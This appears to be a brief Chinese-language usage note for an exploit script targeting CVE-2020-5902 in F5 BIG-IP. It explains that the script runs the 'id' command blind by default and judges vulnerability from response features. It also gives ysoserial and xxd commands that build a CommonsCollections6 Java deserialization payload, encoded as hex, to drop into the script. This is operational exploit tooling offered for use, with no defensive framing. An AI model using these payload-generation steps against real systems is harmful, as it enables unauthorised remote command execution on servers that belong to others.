原理同 [https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/CVE-2020-5902.sh](https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/CVE-2020-5902.sh)  
默认执行命令id，无回显，根据返回数据包特征判断漏洞。  

可以通过下列命令生成payload，替换脚本中的payload字段
```
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 "id" > nc.class
xxd -p nc.class | xargs | sed -e 's/ //g' | dd conv=ucase 2>/dev/null > payload.hex
```